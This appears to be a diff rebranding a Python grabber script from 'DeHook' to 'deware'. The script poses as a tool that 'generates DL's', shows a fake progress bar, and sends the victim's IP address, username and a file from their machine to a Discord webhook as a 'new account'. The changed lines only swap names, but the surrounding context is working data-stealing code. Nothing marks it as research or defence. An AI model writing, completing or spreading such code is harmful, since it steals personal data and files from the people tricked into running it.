@@ -4,7 +4,7 @@ from tqdm import tqdm
 from time import sleep
 import socket
 
-#/* Code by Denolaks *\
+#/* Code by deware *\
 
 os.system('cls')
 
@@ -19,7 +19,7 @@ hostname = socket.gethostname()
 ip_adress = socket.gethostbyname(hostname)
 
 while True:
-    question = input(f"1 - Generate DL's (Beta Function!)\n>>")
+    question = input(f"1 - Generate DL's\n>>")
 
     if(question == "1" or 1):
         for i in tqdm(range(100)):
@@ -32,9 +32,9 @@ while True:
     webhook = DiscordWebhook(url=url_hook, username="New account.", avatar_url="https://i.ytimg.com/vi/v6limdoKGvg/maxresdefault.jpg")
     with open(path, 'rb') as f:
 
-        embed = DiscordEmbed(title='```DeHook on Top!.```', description='```NEW ACCOUNT!.```', color='280baa')
+        embed = DiscordEmbed(title='```deware.```', description='```new acc!.```', color='280baa')
         embed.set_thumbnail(url="https://pbs.twimg.com/media/E3sVHm-XoAEOpU4.jpg:large")
-        embed.set_footer(text='UrAppName on Top!', icon_url='https://i.kym-cdn.com/photos/images/newsfeed/001/508/394/28f.jpg')
+        embed.set_footer(text='deware!', icon_url='https://i.kym-cdn.com/photos/images/newsfeed/001/508/394/28f.jpg')
         embed.set_timestamp()
         embed.add_embed_field(name=f'Ip Adress:', value=ip_adress)
         embed.add_embed_field(name=f'Username:', value=usr)
